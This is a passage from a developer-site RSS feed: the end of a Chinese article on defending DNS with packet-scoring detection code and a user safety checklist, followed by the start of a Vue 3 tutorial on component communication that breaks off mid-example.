            <span class="hljs-string">'traffic_analyzer'</span>: TrafficAnalyzer(),
            <span class="hljs-string">'threat_intel'</span>: ThreatIntelligence(),
            <span class="hljs-string">'automated_response'</span>: AutoResponder()
        }
    
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">protect_network</span>(<span class="hljs-params">self</span>):
        <span class="hljs-comment"># 1. 实时流量分析</span>
        <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:
            packet = capture_packet()
            
            <span class="hljs-comment"># 2. DNS特定检测</span>
            <span class="hljs-keyword">if</span> packet.haslayer(DNS):
                threat_score = self.analyze_dns_packet(packet)
                
                <span class="hljs-comment"># 3. 威胁情报匹配</span>
                <span class="hljs-keyword">if</span> self.threat_intel.check_ioc(packet):
                    self.block_and_alert(packet)
                
                <span class="hljs-comment"># 4. 行为分析</span>
                <span class="hljs-keyword">elif</span> threat_score &gt; self.threshold:
                    self.rate_limit_or_block(packet)
                
                <span class="hljs-comment"># 5. 学习模式</span>
                <span class="hljs-keyword">else</span>:
                    self.update_baseline(packet)
    
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">analyze_dns_packet</span>(<span class="hljs-params">self, packet</span>):
        score = <span class="hljs-number">0</span>
        
        <span class="hljs-comment"># 检测指标</span>
        indicators = {
            <span class="hljs-string">'query_length'</span>: <span class="hljs-built_in">len</span>(packet[DNS].qd.qname),
            <span class="hljs-string">'query_type'</span>: packet[DNS].qd.qtype,
            <span class="hljs-string">'response_size'</span>: <span class="hljs-built_in">len</span>(packet) <span class="hljs-keyword">if</span> packet[DNS].qr <span class="hljs-keyword">else</span> <span class="hljs-number">0</span>,
            <span class="hljs-string">'client_history'</span>: self.get_client_history(packet[IP].src),
            <span class="hljs-string">'domain_reputation'</span>: self.check_domain_reputation(packet[DNS].qd.qname)
        }
        
        <span class="hljs-comment"># 评分规则</span>
        <span class="hljs-keyword">if</span> indicators[<span class="hljs-string">'query_type'</span>] == <span class="hljs-number">255</span>:  <span class="hljs-comment"># ANY查询</span>
            score += <span class="hljs-number">20</span>
        
        <span class="hljs-keyword">if</span> indicators[<span class="hljs-string">'response_size'</span>] &gt; <span class="hljs-number">2000</span>:  <span class="hljs-comment"># 大响应</span>
            score += <span class="hljs-number">15</span>
        
        <span class="hljs-keyword">if</span> indicators[<span class="hljs-string">'domain_reputation'</span>] == <span class="hljs-string">'malicious'</span>:
            score += <span class="hljs-number">50</span>
        
        <span class="hljs-keyword">return</span> score
</code></pre>
<h3 data-id="heading-26"><strong>5.4 个人用户防护指南</strong></h3>
<pre><code class="hljs language-markdown" lang="markdown"><span class="hljs-section"># 个人DNS安全自查清单</span>

<span class="hljs-section">## 立即检查项目</span>
<span class="hljs-bullet">-</span> [ ] 路由器管理员密码是否已修改（不要使用admin/admin）
<span class="hljs-bullet">-</span> [ ] 路由器固件是否最新版本
<span class="hljs-bullet">-</span> [ ] 电脑Hosts文件是否被异常修改
<span class="hljs-bullet">-</span> [ ] 是否使用可靠的DNS服务器（如8.8.8.8, 1.1.1.1）

<span class="hljs-section">## 浏览器安全设置</span>
<span class="hljs-bullet">1.</span> Chrome/Firefox: 启用DoH
<span class="hljs-bullet">2.</span> 使用HTTPS Everywhere扩展
<span class="hljs-bullet">3.</span> 禁用不安全的插件

<span class="hljs-section">## 网络习惯</span>
<span class="hljs-bullet">-</span> 避免连接公共Wi-Fi进行敏感操作
<span class="hljs-bullet">-</span> 定期检查银行账户异常
<span class="hljs-bullet">-</span> 对异常重定向保持警惕

<span class="hljs-section">## 工具推荐</span>
<span class="hljs-bullet">-</span> DNSLeakTest.com: 检测DNS泄露
<span class="hljs-bullet">-</span> GRC DNS Benchmark: 测试DNS性能和安全
<span class="hljs-bullet">-</span> Wireshark: 高级用户网络分析
</code></pre>
<h2 data-id="heading-27"><strong>六、未来展望：DNS安全的演进</strong></h2>
<h3 data-id="heading-28"><strong>6.1 新技术标准</strong></h3>
<p><strong>正在发展的标准</strong>：</p>
<pre><code class="hljs language-plaintext" lang="plaintext">1. DNS over QUIC (DoQ)
   - 结合QUIC协议的优点
   - 更好的连接迁移和丢包恢复

2. Oblivious DNS over HTTPS (ODoH)
   - 添加代理层，隐藏用户身份
   - 解决DoH的中心化隐私问题

3. 后量子DNS安全
   - NIST后量子密码学竞赛获胜者
   - 抗量子计算的DNSSEC
</code></pre>
<h3 data-id="heading-29"><strong>6.2 人工智能在DNS安全中的应用</strong></h3>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">class</span> <span class="hljs-title class_">AIDNSDefender</span>:
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self</span>):
        self.model = self.train_ai_model()
    
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">train_ai_model</span>(<span class="hljs-params">self</span>):
        <span class="hljs-comment"># 使用历史攻击数据训练</span>
        features = [
            <span class="hljs-string">'query_frequency'</span>,
            <span class="hljs-string">'response_amplification'</span>,
            <span class="hljs-string">'domain_entropy'</span>,
            <span class="hljs-string">'geographic_anomaly'</span>,
            <span class="hljs-string">'temporal_pattern'</span>
        ]
        
        <span class="hljs-comment"># 深度学习检测</span>
        model = Sequential([
            Dense(<span class="hljs-number">128</span>, activation=<span class="hljs-string">'relu'</span>, input_shape=(<span class="hljs-built_in">len</span>(features),)),
            Dropout(<span class="hljs-number">0.3</span>),
            Dense(<span class="hljs-number">64</span>, activation=<span class="hljs-string">'relu'</span>),
            Dense(<span class="hljs-number">32</span>, activation=<span class="hljs-string">'relu'</span>),
            Dense(<span class="hljs-number">1</span>, activation=<span class="hljs-string">'sigmoid'</span>)  <span class="hljs-comment"># 攻击概率</span>
        ])
        
        <span class="hljs-keyword">return</span> model
    
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">realtime_detection</span>(<span class="hljs-params">self, dns_traffic</span>):
        predictions = self.model.predict(dns_traffic)
        
        <span class="hljs-comment"># 自适应阈值</span>
        threshold = self.calculate_dynamic_threshold()
        
        attacks_detected = predictions &gt; threshold
        
        <span class="hljs-comment"># 自动化响应</span>
        <span class="hljs-keyword">for</span> i, is_attack <span class="hljs-keyword">in</span> <span class="hljs-built_in">enumerate</span>(attacks_detected):
            <span class="hljs-keyword">if</span> is_attack:
                self.trigger_response(dns_traffic[i])
</code></pre>
<h2 data-id="heading-30"><strong>总结：构建深度防御体系</strong></h2>
<p>DNS安全不是单一技术能解决的问题，而是需要<strong>多层次、多维度的防御</strong>：</p>
<ol>
<li><strong>协议层</strong>：DNSSEC、DoH/DoT、响应速率限制</li>
<li><strong>网络层</strong>：BCP38、流量清洗、防火墙规则</li>
<li><strong>应用层</strong>：证书锁定、CSP策略、子域名监控</li>
<li><strong>用户层</strong>：安全意识、安全工具、良好习惯</li>
</ol>
<p><strong>记住</strong>：攻击者只需要找到<strong>一个漏洞</strong>，而防御者需要保护<strong>整个系统</strong>。DNS安全是一场持续的战斗，需要技术、策略和警惕性的结合。</p>
<p>随着新技术（如量子计算、5G、物联网）的发展，DNS攻击面只会越来越大。但只要我们持续学习、适应和创新，就能在这个不断变化的威胁环境中保持安全。</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Vue 组件通信的 8 种最佳实践，你知道几种？]]></title>    <link>https://juejin.cn/post/7589932422654459940</link>    <guid>https://juejin.cn/post/7589932422654459940</guid>    <pubDate>2026-01-02T09:11:53.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7589932422654459940" data-draft-id="7580547126360539199" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Vue 组件通信的 8 种最佳实践，你知道几种？"/> <meta itemprop="keywords" content="前端,Vue.js"/> <meta itemprop="datePublished" content="2026-01-02T09:11:53.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="刘大华"/> <meta itemprop="url" content="https://juejin.cn/user/3507878440995946"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Vue 组件通信的 8 种最佳实践，你知道几种？
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3507878440995946/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    刘大华
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-02T09:11:53.000Z" title="Fri Jan 02 2026 09:11:53 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-02
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读10分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>经常写 Vue 的朋友应该很熟悉，在 Vue 的应用中，组件化开发可以让我们的代码更容易维护，而组件之间的<strong>数据传递</strong>和<strong>事件通信</strong>也是我们必须要解决的问题。</p>
<p>经过多个项目的实践，我逐渐摸清了Vue3中8种组件通信方式和适用场景。</p>
<p>下面来给大家分享一下。</p>
<h2 data-id="heading-0">1. Props / Emits：最基础的父子传值</h2>
<p>这是 Vue 的官方推荐通信方式，遵循<strong>单向数据流</strong>原则，数据只能从上往下流，事件从下往上传。</p>
<h3 data-id="heading-1">Props：父传子的单向数据流</h3>
<p><strong>适用场景</strong>：当你需要把配置、用户信息、状态等数据从父组件传递给子组件时。</p>
<pre><code class="hljs language-html" lang="html"><span class="hljs-comment">&lt;!-- 父组件 Parent.vue --&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">template</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"parent"</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">h2</span>&gt;</span>父组件<span class="hljs-tag">&lt;/<span class="hljs-name">h2</span>&gt;</span>
    <span class="hljs-comment">&lt;!-- 传递静态和动态数据 --&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">ChildComponent</span> 
      <span class="hljs-attr">title</span>=<span class="hljs-string">"用户信息"</span> 
      <span class="hljs-attr">:user</span>=<span class="hljs-string">"userData"</span>
      <span class="hljs-attr">:count</span>=<span class="hljs-string">"clickCount"</span>
    /&gt;</span>
  <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">template</span>&gt;</span>

<span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">setup</span>&gt;</span><span class="javascript">
<span class="hljs-keyword">import</span> { ref, reactive } <span class="hljs-keyword">from</span> <span class="hljs-string">'vue'</span>
<span class="hljs-keyword">import</span> <span class="hljs-title class_">ChildComponent</span> <span class="hljs-keyword">from</span> <span class="hljs-string">'./ChildComponent.vue'</span>

<span class="hljs-keyword">const</span> userData = <span class="hljs-title function_">reactive</span>({
  <span class="hljs-attr">name</span>: <span class="hljs-string">'张三'</span>,
  <span class="hljs-attr">age</span>: <span class="hljs-number">25</span>,
  <span class="hljs-attr">email</span>: <span class="hljs-string">'zhangsan@example.com'</span>
})

<span class="hljs-keyword">const</span> clickCount = <span class="hljs-title function_">ref</span>(<span class="hljs-number">0</span>)
</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>
</code></pre>
<pre><code class="hljs language-html" lang="html"><span class="hljs-comment">&lt;!-- 子组件 ChildComponent.vue --&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">template</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"child"</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">h3</span>&gt;</span>{{ title }}<span class="hljs-tag">&lt;/<span class="hljs-name">h3</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"user-card"</span>&gt;</span>
      <span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>姓名：{{ user.name }}<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span>
      <span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>年龄：{{ user.age }}<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span>
      <span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>邮箱：{{ user.email }}<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>点击次数：{{ count }}<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span>
  <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">template</span>&gt;</span>

<span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">setup</span>&gt;</span><span class="javascript">
<span class="hljs-comment">// 方式1：简单定义</span>
<span class="hljs-comment">// defineProps(['title', 'user', 'count'])</span>

<span class="hljs-comment">// 方式2：带类型验证（推荐）</span>
<span class="hljs-title function_">defineProps</span>({
  <span class="hljs-attr">title</span>: {
    <span class="hljs-attr">type</span>: <span class="hljs-title class_">String</span>,
    <span class="hljs-attr">required</span>: <span class="hljs-literal">true</span>
  },
  <span class="hljs-attr">user</span>: {
    <span class="hljs-attr">type</span>: <span class="hljs-title class_">Object</span>,
    <span class="hljs-attr">default</span>: <span class="hljs-function">() =&gt;</span> ({})
  },
  <span class="hljs-attr">count</span>: {
    <span class="hljs-attr">type</span>: <span class="hljs-title class_">Number</span>,
    <span class="hljs-attr">default</span>: <span class="hljs-number">0</span>
  }
})

<span class="hljs-comment">// 方式3：使用 TypeScript（最佳实践）</span>
interface <span class="hljs-title class_">Props</span> {
  <span class="hljs-attr">title</span>: string
  <span class="hljs-attr">user</span>: {
    <span class="hljs-attr">name</span>: string
    <span class="hljs-attr">age</span>: number
    <span class="hljs-attr">email</span>: string
  }
  count?: number
}

defineProps&lt;<span class="hljs-title class_">Props</span>&gt;()
</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>
</code></pre>
<p><strong>为什么推荐带验证？</strong></p>
<p>它能提前发现传参错误，比如把字符串传给了 count，Vue 会在控制台报错，避免线上bug。</p>
<hr/>
<h3 data-id="heading-2">Emits：子传父的事件机制</h3>
<p><strong>适用场景</strong>：子组件需要通知父组件有事发生，比如表单提交、按钮点击、输入变化等。</p>
<pre><code class="hljs language-html" lang="html"><span class="hljs-comment">&lt;!-- 子组件 ChildComponent.vue --&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">template</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"child"</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">button</span> @<span class="hljs-attr">click</span>=<span class="hljs-string">"handleButtonClick"</span>&gt;</span>通知父组件<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">input</span> 
      <span class="hljs-attr">:value</span>=<span class="hljs-string">"inputValue"</span> 
      @<span class="hljs-attr">input</span>=<span class="hljs-string">"handleInputChange"</span>
      <span class="hljs-attr">placeholder</span>=<span class="hljs-string">"输入内容..."</span>
    /&gt;</span>
  <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">template</span>&gt;</span>

<span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">setup</span>&gt;</span><span class="javascript">
<span class="hljs-keyword">import</span> { ref } <span class="hljs-keyword">from</span> <span class="hljs-string">'vue'</span>

<span class="hljs-comment">// 定义可触发的事件</span>
<span class="hljs-keyword">const</span> emit = <span class="hljs-title function_">defineEmits</span>([<span class="hljs-string">'button-clicked'</span>, <span class="hljs-string">'input-changed'</span>, <span class="hljs-string">'update:modelValue'</span>])

<span class="hljs-keyword">const</span> inputValue = <span class="hljs-title function_">ref</span>(<span class="hljs-string">''</span>)

<span class="hljs-keyword">const</span> <span class="hljs-title function_">handleButtonClick</span> = (<span class="hljs-params"/>) =&gt; {
  <span class="hljs-comment">// 触发事件并传递数据</span>
  <span class="hljs-title function_">emit</span>(<span class="hljs-string">'button-clicked'</span>, {
    <span class="hljs-attr">message</span>: <span class="hljs-string">'按钮被点击了！'</span>,
    <span class="hljs-attr">timestamp</span>: <span class="hljs-keyword">new</span> <span class="hljs-title class_">Date</span>().<span class="hljs-title function_">toISOString</span>()
  })
}

<span class="hljs-keyword">const</span> <span class="hljs-title function_">handleInputChange</span> = (<span class="hljs-params">event</span>) =&gt; {
  inputValue.<span class="hljs-property">value</span> = event.<span class="hljs-property">target</span>.<span class="hljs-property">value</span>
  <span class="hljs-title function_">emit</span>(<span class="hljs-string">'input-changed'</span>, inputValue.<span class="hljs-property">value</span>)
  
  <span class="hljs-comment">// 支持 v-model 的更新方式</span>
  <span class="hljs-title function_">emit</span>(<span class="hljs-string">'update:modelValue'</span>, inputValue.<span class="hljs-property">value</span>)
}
</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>
</code></pre>
<pre><code class="hljs language-html" lang="html"><span class="hljs-comment">&lt;!-- 父组件 Parent.vue --&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">template</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"parent"</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">ChildComponent</span> 
      @<span class="hljs-attr">button-clicked</span>=<span class="hljs-string">"handleChildButtonClick"</span>
      @<span class="hljs-attr">input-changed</span>=<span class="hljs-string">"handleChildInputChange"</span>
    /&gt;</span>
    
    <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">v-if</span>=<span class="hljs-string">"lastEvent"</span>&gt;</span>
      <span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>最后收到的事件：{{ lastEvent.type }}<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span>
      <span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>数据：{{ lastEvent.data }}<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
  <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">template</span>&gt;</span>

<span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">setup</span>&gt;</span><span class="javascript">
<span class="hljs-keyword">import</span> { ref } <span class="hljs-keyword">from</span> <span class="hljs-string">'vue'</span>

<span class="hljs-keyword">const</span> lastEvent = <span class="hljs-title function_">ref</span>(<span class="hljs-literal">null</span>)

<span class="hljs-keyword">const</span> <span class="hljs-title function_">handleChildButtonClick</span> = (<span class="hljs-params">data</span>) =&gt; {
  lastEvent.<span class="hljs-property">value</span> = {
    <span class="hljs-attr">type</span>: <span class="hljs-string">'button-clicked'</span>,
    <span class="hljs-attr">data</span>: data
  }
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'收到子组件消息：'</span>, data)
}

<span class="hljs-keyword">const</span> <span class="hljs-title function_">handleChildInputChange</span> = (<span class="hljs-params">value</span>) =&gt; {
  lastEvent.<span class="hljs-property">value</span> = {
    <span class="hljs-attr">type</span>: <span class="hljs-string">'input-changed'</span>,
    <span class="hljs-attr">data</span>: value
  }
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'输入内容：'</span>, value)
}
</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>
</code></pre>
<p><strong>关键点：</strong></p>
<ul>
<li>子组件不直接修改父组件数据，而是发出请求，由父组件决定如何处理。</li>
<li>这种解耦设计让组件更可复用、更易测试。</li>
</ul>
<hr/>
<h2 data-id="heading-3">2. v-model：双向绑定的语法糖</h2>
<p>v-model 在 Vue3 中变得更加强大，支持多个 v-model 绑定。</p>
<h3 data-id="heading-4">基础用法</h3>
<pre><code class="hljs language-html" lang="html"><span class="hljs-comment">&lt;!-- 父组件 --&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">template</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">CustomInput</span> <span class="hljs-attr">v-model</span>=<span class="hljs-string">"username"</span> /&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>当前用户名：{{ username }}<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span>
    
    <span class="hljs-comment">&lt;!-- 多个 v-model --&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">UserForm</span>
      <span class="hljs-attr">v-model:name</span>=<span class="hljs-string">"userName"</span>
      <span class="hljs-attr">v-model:email</span>=<span class="hljs-string">"userEmail"</span>
      <span class="hljs-attr">v-model:age</span>=<span class="hljs-string">"userAge"</span>
    /&gt;</span>
  <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">template</span>&gt;</span>

<span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">setup</span>&gt;</span><span class="javascript">
<span class="hljs-keyword">import</span> { ref } <span class="hljs-keyword">from</span> <span class="hljs-string">'vue'</span>

<span class="hljs-keyword">const</span> username = <span class="hljs-title function_">ref</span>(<span class="hljs-string">''</span>)
<span class="hljs-keyword">const</span> userName = <span class="hljs-title function_">ref</span>(<span class="hljs-string">''</span>)
<span class="hljs-keyword">const</span> userEmail = <span class="hljs-title function_">ref</span>(<span class="hljs-string">''</span>)
<span class="hljs-keyword">const</span> userAge = <span class="hljs-title function_">ref</span>(<span class="hljs-number">0</span>)
</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>
</code></pre>
<pre><code class="hljs language-html" lang="html"><span class="hljs-comment">&lt;!-- 子组件 CustomInput.vue --&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">template</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"custom-input"</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">label</span>&gt;</span>用户名：<span class="hljs-tag">&lt;/<span class="hljs-name">label</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">input</span>
      <span class="hljs-attr">:value</span>=<span class="hljs-string">"modelValue"</span>
      @<span class="hljs-attr">input</span>=<span class="hljs-string">"$emit('update:modelValue', $event.target.value)"</span>
      <span class="hljs-attr">class</span>=<span class="hljs-string">"input-field"</span>
    /&gt;</span>
  <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">template</span>&gt;</span>

<span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">setup</span>&gt;</span><span class="javascript">
<span class="hljs-title function_">defineProps</span>([<span class="hljs-string">'modelValue'</span>])
<span class="hljs-title function_">defineEmits</span>([<span class="hljs-string">'update:modelValue'</span>])
</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>
</code></pre>
<pre><code class="hljs language-html" lang="html"><span class="hljs-comment">&lt;!-- 子组件 UserForm.vue --&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">template</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"user-form"</span>&gt;</span>
